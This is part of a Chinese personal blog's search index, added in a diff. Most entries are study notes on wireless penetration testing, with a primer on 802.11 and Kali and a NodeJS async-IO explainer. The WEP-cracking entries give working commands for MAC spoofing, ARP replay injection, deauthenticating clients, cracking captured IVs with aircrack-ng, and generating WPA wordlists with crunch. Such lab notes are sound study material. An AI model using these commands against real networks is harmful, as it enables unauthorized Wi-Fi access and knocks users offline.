+        <content type="html"><![CDATA[<p>转自安全客<br>有一点推荐：<br>修改伪IPMAC为目标Ap的MAC<br>使用macchanger -m 02:BD:11:11:11:11 wlan0(修改前先down掉)<br><img src="/2017/02/12/WEP破解-破解WEP新思路-Hirte/1.jpg" alt="1">  </p>
+<p><img src="/2017/02/12/WEP破解-破解WEP新思路-Hirte/2.jpg" alt="2">  </p>
+<p><img src="/2017/02/12/WEP破解-破解WEP新思路-Hirte/3.jpg" alt="3">  </p>
+<p><img src="/2017/02/12/WEP破解-破解WEP新思路-Hirte/4.jpg" alt="4"> </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> WEP </tag>
+            
+            <tag> Hirte </tag>
+            
+            <tag> macchanger </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WEP破解-wifite自动化破解WEP加密]]></title>
+        <url>https://517736522.github.io/2017/02/12/WEP%E7%A0%B4%E8%A7%A3-wifite%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A0%B4%E8%A7%A3WEP%E5%8A%A0%E5%AF%86/</url>
+        <content type="html"><![CDATA[<p>wifite工具为kali自带，此工具自动使用各种攻击方式进行抓包<br><img src="/2017/02/12/WEP破解-wifite自动化破解WEP加密/1.jpg" alt="1"><br>选择有client的会比较容易破解，有client的会自动采用ARP重放攻击等方式容易收集ivs<br>ctrl+c然后选择AP num<br><img src="/2017/02/12/WEP破解-wifite自动化破解WEP加密/2.jpg" alt="2"><br>等到特定数目时，会自动使用Crack<br>破解不成功会继续收集ivs直到成功为止。</p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> WEP </tag>
+            
+            <tag> wifite </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WEP破解-Gerix-wifi-cracker自动化破解WEP加密]]></title>
+        <url>https://517736522.github.io/2017/02/12/WEP%E7%A0%B4%E8%A7%A3-Gerix-wifi-cracker%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A0%B4%E8%A7%A3WEP%E5%8A%A0%E5%AF%86/</url>
+        <content type="html"><![CDATA[<p>Gerix这个工具原先在BT5有，到kali就没了<br>直接运行python gerix.py<br>出现图形化界面<br><img src="/2017/02/12/WEP破解-Gerix-wifi-cracker自动化破解WEP加密/1.jpg" alt="1"><br>在configuration界面选择网卡，单击网卡名称即可（mon0)<br>选择下方的Rescan networks扫描附近网络<br>再单击目标Essid即可<br>此次选择的是wep加密方式的AP<br>切换到WEP选项卡<br>此次就使用通用方式General functionalities<br>选择start sniffing and logging开始抓包<br><img src="/2017/02/12/WEP破解-Gerix-wifi-cracker自动化破解WEP加密/1.jpg" alt="1"><br> 在点击 Performs a test injection AP进行攻击<br>使用的是aireplay-ng -9 -a 02:…:ee …<br>等待Data&gt;5000,就可以切换到Cracking选项卡点击Aircrack-ng Decrypt WEP password<br>如果初始化向量增长慢，可以用aRP重放攻击（WEP选项卡里有）<br><img src="/2017/02/12/WEP破解-Gerix-wifi-cracker自动化破解WEP加密/3.jpg" alt="3"><br>大概15000ivs即可 </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> WEP </tag>
+            
+            <tag> Gerix </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[WEP破解-aircrack-ng破解WEP加密]]></title>
+        <url>https://517736522.github.io/2017/02/12/WEP%E7%A0%B4%E8%A7%A3-aircrack-ng%E7%A0%B4%E8%A7%A3WEP%E5%8A%A0%E5%AF%86/</url>
+        <content type="html"><![CDATA[<p>wep加密方式已经不常见了，因为wep加密很脆弱，几分钟就可破解。<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/1.jpg" alt="1"><br>家用路由器环境  </p>
+<p>在此讲一下Aircrack-ng工具包：<br>aircrack-ng 破解<br>airmon-ng 改变网卡工作模式<br>airodump-ng 捕获报文<br>aireplay-ng 提供各种攻击（例如arp注入攻击），为airodump-ng创造更多报文<br>airserv-ng 网卡连接到指定端口 可用来做无限跳板<br>airolib-ng 彩虹表破解创建数据库文件<br>airdecap-ng 解包  </p>
+<p>将网卡启用监听模式后airodump-ng wlan0mon确认路由器情况捕获信息<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/2.jpg" alt="2"><br>然后用airodump wlan0mon -c 1 –ivs(只保存初始化向量） -w /root/桌面/wep –bssid 02:BD:18:08:28:66  只对它一个进行抓包<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/3.jpg" alt="3"><br>如果下面没有客户端时，在实验中可以自己手机主动连接到该AP,在实际操作中只能等待别人客户端连接！<br>接下来需要进行ARP重放攻击（截获ARP报文，将数据修改伪装成ARP报文再发送，获取回应的初始化向量）<br>使用到aireplay-ng<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/4.jpg" alt="4"><br>aireplay-ng -3 -b 02:BD:18:08:28:66 -h 98:FA:E3:5E:DF:F9 wlan0mon<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/5.jpg" alt="5"><br>但是连接后的客户端已经映射好了ARP，不在产生ARP请求了<br>可以使用掉帧重连攻击（使得客户端重新连接AP,即可产生ARP报文）<br>aireplay-ng -0 5 -a 02:BD:18:08:28:66 -c 98:FA:E3:5E:DF:F9 wlan0mon<br>使用deauth攻击方式5次，-a ap,-c 客户端<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/6.jpg" alt="6"><br>等待客户端重新连接<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/7.jpg" alt="7"><br>连接上后发现ARP请求<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/8.jpg" alt="8"><br>Frames快速增长,等到越多越好（作者等到了10W)<br>接下来进行破解，另开终端<br>输入aircrack-ng /root/桌面/WEP-01.ivs<br><img src="/2017/02/12/WEP破解-aircrack-ng破解WEP加密/9.jpg" alt="9"><br>不到1秒就破解出来了<br>FF：A4:E9:ED:17去掉：就是密码了</p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> aircrack-ng </tag>
+            
+            <tag> WEP </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[环境初探-熟悉kismet、airdump-ng]]></title>
+        <url>https://517736522.github.io/2017/02/12/%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2-%E7%86%9F%E6%82%89kismet,airodump-ng/</url>
+        <content type="html"><![CDATA[<h1 id="kismet"><a href="#kismet" class="headerlink" title="kismet"></a>kismet</h1><p>kismet为kali内置工具–扫描附近无线网络<br>现将网卡置为监听模式<br>airmon-ng start wlan0<br>出现wlan0mon网卡<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/1.jpg" alt="1"><br>输入kismet回车<br>一路回车<br>出现这个界面时<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/2.jpg" alt="2"><br>输入网卡名称-add<br>出现主界面<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/3.jpg" alt="3"><br>sort排序<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/4.jpg" alt="4"><br>出现的网卡为可选的，双击可查看详细信息<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/5.jpg" alt="5"><br>type：Beacon（advertising AP)<br>信标帧Beacon分为probe request和probe relay<br>主动探测为发送request 寻找附近AP ,AP 就回复relay  </p>
+<h1 id="airodump-ng"><a href="#airodump-ng" class="headerlink" title="airodump-ng"></a>airodump-ng</h1><p>airodump-ng为kali内置工具—抓包（握手包）<br>现将网卡置为监听模式（monitor mode)<br>airmon-ng start wlan0<br>kali1.0可以直接使用airodump-ng wlan0 抓包<br>kali2.0直接使用airodump-ng wlan0mon会出现问题<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/6.jpg" alt="6"><br>需要先把wlan0mon down掉<br>ifconfig wlan0mon down再抓包就行了<br><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/7.jpg" alt="7">  </p>
+<p>airodump有几个选项<br>-w 输出文件<br>–ivs 只保存ivs<br>-c 信道<br>–bssid mac<br>–essid 名称<br>airodump-ng -w /root/桌面/1  -c 1 wlan0mon  </p>
+<p>BSSID ap的mac<br>PWR 信号强度<br>Beacons 无线ap发的通告，周期发送（定期发送信标帧，“我在着呢！”）<br>#Data 抓到的数据包<br>ch 信道<br>MB 数字表示最大传输速率（网络标准),e表示802.11e,”.”表示短前导码。<br>注意：前导码是数据包的一组比特组，用来让接受者同步并准备接受实际的数据。<br>ENC 加密方式<br>CIPHER 加密算法，WPA-TKIP WPA2-CCMP<br>AUTH 认证 MGT PSK OPN开放 pre-shared key(域共享秘钥）<br>ESSID 通俗指wifi名字 <length:8>这样表示未广播<br>Station 客户端<br>RATE 传输速率比如300M无线路由器<br>Lost 最近的10秒内丢包数seq tcp<br>Frames 来自客户端的数据frame<br>Probe 主动探测  </length:8></p>
+<h2 id="特殊讲解："><a href="#特殊讲解：" class="headerlink" title="特殊讲解："></a>特殊讲解：</h2><p><img src="/2017/02/12/环境初探-熟悉kismet,airodump-ng/8.jpg" alt="8"><br>not associated 表示未关联，是因为客户端发出信标帧，未与AP连接<br>有时候channel会显示-1 应不予理会也可加选项–ignore-negative-one<br>抓到握手包会在界面右上角显示hand-shark字样  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> kismet </tag>
+            
+            <tag> airodump-ng </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[无线渗透课前知识]]></title>
+        <url>https://517736522.github.io/2017/02/11/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E8%AF%BE%E5%89%8D%E7%9F%A5%E8%AF%86/</url>
+        <content type="html"><![CDATA[<h1 id="Aircrack-ng工具包"><a href="#Aircrack-ng工具包" class="headerlink" title="Aircrack-ng工具包"></a>Aircrack-ng工具包</h1><p><img src="/2017/02/11/无线渗透课前知识/1.jpg" alt="1"> </p>
+<h2 id="802-11a-b-c-g-n-ac标准：（802协议全都在二层）"><a href="#802-11a-b-c-g-n-ac标准：（802协议全都在二层）" class="headerlink" title="802.11a/b/c/g/n/ac标准：（802协议全都在二层）   "></a>802.11a/b/c/g/n/ac标准：（802协议全都在二层）   </h2><p>IEEE提出，是工作在数据链路层（二层）的无线协议  </p>
+<h2 id="wifi标准："><a href="#wifi标准：" class="headerlink" title="wifi标准："></a>wifi标准：</h2><p>是有wifi联盟提出的一个802.11标准的一个子集。wifi联盟保证了各种不同的无线产品能一起工作。    </p>
+<h2 id="无线接入点Access-Point："><a href="#无线接入点Access-Point：" class="headerlink" title="无线接入点Access Point："></a>无线接入点Access Point：</h2><p>胖AP:类似于家用无线路由器，具有三层路由功能<br>瘦AP:仅仅类似于以太网集线器，用于转换电信号和无线信号  </p>
+<h2 id="客户端STA"><a href="#客户端STA" class="headerlink" title="客户端STA:  "></a>客户端STA:  </h2><p>连接上AP的主机为客户端  </p>
+<h2 id="无线局域网ap术语介绍："><a href="#无线局域网ap术语介绍：" class="headerlink" title="无线局域网ap术语介绍："></a>无线局域网ap术语介绍：</h2><p>SSID服务集标识： WIFI名称<br>BSSID：AP的2层地址，mac地址（高级AP会有多个BSSID)<br>ESSID:扩展服务集标识，通常是跟SSID对等，实际不同<br>工作模式：802.11b/g/n(2.4G) /a/n/ac(5G) （/n模式和速率向下兼容）   </p>
+<h2 id="信道channel："><a href="#信道channel：" class="headerlink" title="信道channel："></a>信道channel：</h2><p>发送方和接收方期望载波的频率是固定的，并在特殊性定的范围内变化，这种范围称为信道，WLAN信道是由当前使用的802.11标准决定的。  </p>
+<p><img src="/2017/02/11/无线渗透课前知识/2.jpg" alt="2"> </p>
+<p><img src="/2017/02/11/无线渗透课前知识/3.jpg" alt="3"></p>
+<p>信道是由法律规定的<br>1,6,11信道互不重叠，互不干扰  </p>
+<p>RSSI是信号强度记录器，一般是一个负值，越接近0越好<br>dBm值从一个信号等级系数获取，它由厂商决定<br>SNR（信噪比）是信号强度相对于噪音的级别，越高越好</p>
+<h2 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h2><p>1.虚拟机kali linux<br>2.USB无线网卡 RT3070 RTL8187<br>3.打开服务VMware USB Arbitration Service  </p>
+<h2 id="无线网卡的工作模式："><a href="#无线网卡的工作模式：" class="headerlink" title="无线网卡的工作模式："></a>无线网卡的工作模式：</h2><p>1.Managed Mode（平时连接WIFI）<br>2.Ad Hoc（10年前的东西，对等网络，组成局域网）<br>3.Master Mode(猎豹免费WIFI,soft-AP)<br>4.Monitor Mode(监听模式， （混杂模式为有线监听））<br>5.WDS  </p>
+<h2 id="kali命令："><a href="#kali命令：" class="headerlink" title="kali命令："></a>kali命令：</h2><p>service /etc/init.d/networking restart 重启网卡<br>vim /etc/resolv.conf 修改DNS<br>内容为nameserver 8.8.8.8  </p>
+<h2 id="关于破解wpa："><a href="#关于破解wpa：" class="headerlink" title="关于破解wpa："></a>关于破解wpa：</h2><p>先用有关社会工程学软件生成字典尝试破解，不行再用大字典<br>Crunch生成字典工具<br>crunch 最短长度 最长长度 字符集 选项<br>crunch 8 12 -f /usr/share/crunch/charset.1st(字符集）ualpha -o /root/pass.txt  </p>
+<h2 id="WirelessMon-professional："><a href="#WirelessMon-professional：" class="headerlink" title="WirelessMon professional："></a>WirelessMon professional：</h2><p>实现WINDOWS下对附近无线网络进行扫描<br><img src="/2017/02/11/无线渗透课前知识/4.jpg" alt="4"><br><img src="/2017/02/11/无线渗透课前知识/5.jpg" alt="5"></p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[关于NodeJS的单线程和异步IO]]></title>
+        <url>https://517736522.github.io/2017/01/21/%E5%85%B3%E4%BA%8ENodeJS%E7%9A%84%E5%8D%95%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%BC%82%E6%AD%A5IO/</url>
+        <content type="html"><![CDATA[<h5 id="引用文-摘自-IBM-刘欣-个人公众号：码农翻身"><a href="#引用文-摘自-IBM-刘欣-个人公众号：码农翻身" class="headerlink" title="引用文  摘自 IBM 刘欣 个人公众号：码农翻身"></a>引用文  摘自 IBM 刘欣 个人公众号：码农翻身</h5><p>美丽的七侠镇上有一条美食街，很多著名的饭店都开在这里，有老字号的Apache, PHP, 最近几年火热的Ruby on Rail , 还有那些重量级的餐饮集团Websphere, Weblogic 等。</p>
+<p>这些饭店老板根据自己的实力，或多或少的雇佣了一些店小二来招待来客，这些小二干活都非常殷勤，没有一个偷懒耍滑，把顾客招待的舒舒服服， 所以平日里饭馆运转的还不错，相安无事。</p>
+<p>但是随着《武林外传》的拍摄和播放， 七侠镇旅游业大爆发，游客像潮水一样蜂拥而至， 现有的店小二招待不过来了， 到了饭点，每家的门前都排起了长队，游客们吃不上饭，个个怨声载道。</p>
+<p>看到这种情况，有些老板咬了咬牙，在人工费不断上涨的情况下， 多雇了一些小二来帮忙， 无奈总是赶不上顾客增长的速度。</p>
+<p>某一天有个美国老外来到七侠镇上旅游， 也看到了吃不上饭的问题，他仔细分析了一番后发现了一个秘密： 原来这些店都采用了同一套叫做“全程贴心服务”的模式， 这个模式很有意思：</p>
+<p>客人来了以后，马上有个店小二殷勤迎上去，带着找座位，点菜，给后厨下单<br>由于后厨做菜需要很长时间，店小二就在客人的旁边等着。</p>
+<p>后厨一摇铃铛，大喊一声：上菜，店小二马上端到客人面前， 然后站在一边等着客人吃完</p>
+<p>客人说：结账，小二收钱，找钱，送客， 迎接下一位。</p>
+<p>通常这个时候门口都排成了好几百人了！</p>
+<p>这个VIP服务实在是太贴心了！ 导致的结果很明显，饭店有几个店小二，就只能同时接待几个顾客。<br>(当然，现实中是没有饭店是这么做的，否则就等着关门吧)</p>
+<p>老外一声不吭的回去了。<br>过了几个月， 美食一条街上出现了一个巨火无比的饭馆： Node.js<br>虽然这个饭店中人满为患， 可门口竟然没有排队的！<br>更让人吃惊的是，这个店里声称： 我只需要一个店小二！</p>
+<p>Node.js这个美国老外开的饭店确实只用了一个店小二， 只不过这个小二干活的方式与众不同，他把所有的工作分为两类：<br>(1) 马上就能干完的，例如迎客，点菜，找座，下单 等等<br>(2) 需要等待别人干完才能干的活，例如上菜，结账等<br>对(1) 这个小二马上干活<br>对(2) 店小二不会等待，他只是告诉别人说，你弄完了告诉我一声，我会接着干， 然后马上去做第一类工作</p>
+<p>客人来了以后，这个店小二殷勤迎上去，带着找座位，点菜，给后厨下单<br>由于后厨做菜需要很长时间，店小二闪电般的离开，去干别的活了，可能是迎客，点菜，找座等，总之是那些不用等待，迅速干完的活。<br>后厨大喊一声：上菜，这个小二马上端到客人面前，然后离开，干其他活。<br>客人说：结账，小二收钱，找钱，然后还是迅速闪人，干其他活。</p>
+<p>这个唯一的店小二的能力被发挥到了极致，一刻不停，闪电般的在饭店里跑来跑去，因为老板明确的告诉他： 不要等！</p>
+<p>Node.js饭店的基础设施很强大，一旦那些耗时的操作完成，店小二立刻就能知道，飞奔过来马上接着干，如果遇到新的耗时的操作，小二毫不留情的离开。<br>就这么简单， Node.js饭店火了，它同时接待客人的数量大大增加，而服务质量保持基本不变。</p>
+<p>这是我杜撰出来的一个不成熟的故事，帮助我来理解Node.js的特点：只用一个线程来处理所有请求，事件驱动编程</p>
+<p>如果我们回过头来再以计算机的视角看一下会更加清楚：<br>店小二： 线程<br>顾客：http请求<br>第一类工作(迎客，找座，下单) : 在服务器端的代码，能够快速执行<br>后厨做菜，客人吃饭： 耗时的I/O 操作<br>后厨大喊一声：上菜 ： 这是一个长时间I/O 操作完成的后所发出的事件<br>客人说：结账： 另外一个长时间I/O 操作完成的后所发出的事件<br>第二类工作(上菜，结账) : 同样是能快速执行的代码，但是他们需要等待那些耗时的I/O 操作完成才能开始，确切的来说，收到了系统发出的事件以后才开始执行。在Node.js中实际上是在回调函数中来执行的</p>
+<pre><code>下面是Node.js服务模式的伪代码：  
+1. 迎客();  
+2.   
+3. 找座();  
+4. 
+5. 下单();  
+6. 
+7. 后厨处理(&quot;做菜完成事件&quot;， function(){  
+8. 
+9.    上菜处理()；  
+10. 
+11. 客人吃饭(&quot;吃饭完成事件&quot;，function(){  
+12. 
+13.     结账处理();  
+14. 
+15.    送客();  
+16. 
+17. });  
+18. 
+19. });  
+20. 
+</code></pre><p>需要引起注意的是：</p>
+<ol>
+<li><p>后厨处理（）这个函数接受两个参数，一个是事件名，另外一个是匿名的回调函数，事件发生，回调函数才会执行。<br>客人吃饭（）函数也是类似。<br>Node.js 使用的JavaScript作为服务器端的编程语言，这种回调的方式对于javascript程序员来说，是非常自然的事情，同时从代码的角度来讲，也显得非常清晰。<br>另外Node.js使用Chrome的V8引擎来执行javascript,效率非常高</p>
+<p> 我们能不能把代码写成这样？  </p>
+<ol>
+<li>迎客();  </li>
+<li></li>
+<li>找座();  </li>
+<li></li>
+<li>下单();  </li>
+<li></li>
+<li>后厨处理(“做菜完成事件”， function(){  </li>
+<li></li>
+<li>上菜处理()；      </li>
+<li></li>
+<li>});  </li>
+<li></li>
+<li>客人吃饭(“吃饭完成事件”，function(){  </li>
+<li></li>
+<li>结账处理();  </li>
+<li></li>
+<li>});  </li>
+<li></li>
+<li>送客();   </li>
+<li></li>
+</ol>
+</li>
+</ol>
+<p>肯定不行！， 因为Node.js执行”后厨处理()”函数时，只是安插了一个匿名的回调函数在那里，并不会等待（非阻塞I/O），反而马上 会执行“客人吃饭()”函数，所以上述的写法会引起逻辑上的错误:还没上菜就开始吃饭了！<br>所以写惯了”顺序阻塞I/O“的我们需要改变一下思维方式，进入到事件驱动的世界中来。</p>
+<p>如果某个操作例如“上菜处理” 是个CPU密集型的计算任务，Node.js那个唯一的线程就会忙于执行这个计算任务而被阻塞住，就无法响应其他的请求了，带来的后果很严重，整个服务器都无法响应了！  这个时候，需要考虑把这样的代码进行异步处理，也变成node.js所擅长的事件驱动的方式。</p>
+]]></content>
+        
+        <categories>
+            
+            <category> web开发 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> NodeJS </tag>
+            
+            <tag> 单线程 </tag>
+            
+            <tag> 异步IO </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    
+    
+    
+    
+</search>
